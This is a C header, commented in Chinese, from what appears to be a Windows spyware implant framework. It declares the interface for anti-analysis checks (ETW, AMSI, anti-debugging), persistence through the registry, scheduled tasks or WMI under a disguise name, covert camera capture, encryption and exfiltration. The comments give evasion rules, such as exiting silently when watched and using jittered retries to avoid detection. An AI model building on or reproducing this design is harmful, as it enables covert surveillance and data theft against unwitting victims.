/*
 * agent_windows/include/implant_main.h
 *
 * Windows 单体植入体接线层：把对抗、驻留、采集、打包、回传串成一条
 * 可投送、可驻留、可持续回传的完整生命周期。
 *
 * 与已有模块的分工（本层不重复实现任何一层）：
 *   对抗层 —— defend 回调注入，真实部署接 defend_win（ETW/AMSI/反调试）
 *   驻留层 —— persist_win（注册表 / 计划任务 / WMI 事件）
 *   采集层 —— camera.h + implant.c（主循环状态机）
 *   打包层 —— pack 回调注入，真实部署接 20_packer
 *   回传层 —— exfil 回调注入，真实部署接 21_exfil / 25_tls
 *
 * 四条硬规则（违反即拒绝运行，不降级）：
 *   1. 对抗自检判定不安全 -> 立即退出，不驻留、不采集、不回传。
 *      在不安全环境里留下任何痕迹都比什么都不做强得多地暴露自己。
 *   2. 未注入 pack 回调 -> 返回 IMW_ERR_NOPACK，一次都不调用 exfil。
 *      宁可什么都不发，也绝不发未加密的帧。
 *   3. 回传失败必须有界重试，退避后放弃并计入错误。无限重试会在链路上
 *      形成"静默-爆发"节拍，本身就是可观测特征。
 *   4. 驻留失败不阻断采集。驻留是一次性机会，采集也是；两者互不牺牲，
 *      驻留失败仍要把当次数据拿回来，并把失败码回给调用方。
 */
#ifndef DAYANJING_AGENT_WINDOWS_IMPLANT_MAIN_H
#define DAYANJING_AGENT_WINDOWS_IMPLANT_MAIN_H

#include "implant.h"
#include "persist_win.h"

#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

#define IMW_OK            0
#define IMW_ERR_PARAM    -1   /* 参数非法 */
#define IMW_ERR_UNSAFE   -2   /* 对抗自检判定环境不安全，全程未动作 */
#define IMW_ERR_NOPACK   -3   /* 未注入 pack，拒绝回传明文 */
#define IMW_ERR_NOEXFIL  -4   /* 未注入 exfil */
#define IMW_ERR_IMPLANT  -5   /* 主循环自身失败（见 result.imp_err） */
#define IMW_ERR_PERSIST  -6   /* 驻留失败且调用方要求严格 */

typedef struct {
    implant_cfg_t imp;            /* 采集与调度配置 */
    const char   *backend;        /* 采集后端名："mf" 真机 / "mock" 测试 */
    const char   *persist_name;   /* 驻留伪装名；NULL = 不驻留 */
    const char   *persist_cmd;    /* 驻留命令行；NULL = 不驻留 */
    pw_method_t   persist_method; /* 驻留机制 */
    uint32_t      exfil_retries;  /* 回传失败重试次数上限（不含首次） */
    uint32_t      backoff_ms;     /* 每次重试前的退避基数（实际含抖动） */
    bool          strict_persist; /* true: 驻留失败即返回 IMW_ERR_PERSIST */
} imw_cfg_t;

typedef struct {
    implant_defend_t defend;   /* 可选；NULL = 跳过自检（仅测试用） */
    void            *defend_ud;
    implant_pack_t   pack;     /* 必需 */
    void            *pack_ud;
    implant_exfil_t  exfil;    /* 必需 */
    void            *exfil_ud;
    pw_exec_t        pexec;    /* 驻留用；REG_RUN 不使用时可为 NULL */
    void            *pexec_ud;
    implant_now_us_t now;      /* 可选；NULL = 用默认时间源 */
    void            *now_ud;
} imw_hooks_t;

typedef struct {
    int            rc;         /* IMW_OK 或负的错误码 */
    int            persist_rc; /* PW_OK / 负的 pw 错误码；未驻留时为 0 */
    int            installed;  /* 驻留后查询确认：1 已装 / 0 未装 / -1 未查 */
    uint32_t       batches;    /* 完成的批数 */
    uint32_t       frames;     /* 采集帧数 */
    uint64_t       bytes;      /* 回传的制品字节累计 */
    uint32_t       errors;     /* 主循环内部错误计数 */
    uint32_t       exfil_fail; /* 回传最终失败的次数（重试后仍失败） */
    implant_err_t  imp_err;    /* 主循环最后错误码 */
} imw_result_t;

/*
 * 完整生命周期：对抗自检 -> 驻留 -> 采集/打包/回传循环。
 * out 可为 NULL。返回 IMW_OK 表示跑完（不代表每批都成功，看 out->errors）。
 */
int imw_run(const imw_cfg_t *cfg, const imw_hooks_t *h, imw_result_t *out);

/* 仅做对抗自检 + 驻留，不采集。用于"先落地生根"的投送阶段。 */
int imw_bootstrap(const imw_cfg_t *cfg, const imw_hooks_t *h,
                  imw_result_t *out);

const char *imw_errstr(int rc);

#ifdef __cplusplus
}
#endif

#endif /* DAYANJING_AGENT_WINDOWS_IMPLANT_MAIN_H */
